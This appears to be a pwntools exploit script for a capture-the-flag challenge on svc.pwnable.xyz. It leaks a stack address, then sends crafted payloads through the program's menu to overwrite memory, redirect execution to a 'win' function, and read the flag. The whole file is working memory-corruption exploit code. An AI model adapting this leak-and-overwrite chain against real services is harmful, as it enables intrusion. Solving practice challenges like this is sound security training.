from pwn import *

context.log_level = "debug"
win_addr = 0x400a3e
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30005)
# gdb.attach(p)

p.sendlineafter('>', '2')
stack_leak = p.recvuntil('\n')[1:-1]
stack_leak = int(stack_leak, 16)
p.sendlineafter('>', '1')
p.sendline('AAAABBBB' + p64(stack_leak+0x58))
p.sendlineafter('>', '3')
p.sendlineafter('>', '1')
p.sendline(p64(win_addr) + p64(stack_leak+0xa8) + p64(0x40))
p.sendlineafter('>', '3')
p.sendlineafter('>', '1')
p.sendline(p64(0x40) + p64(stack_leak+0x70))
p.sendlineafter('>', '3')
p.sendlineafter('>', '0')


p.recvuntil('}')
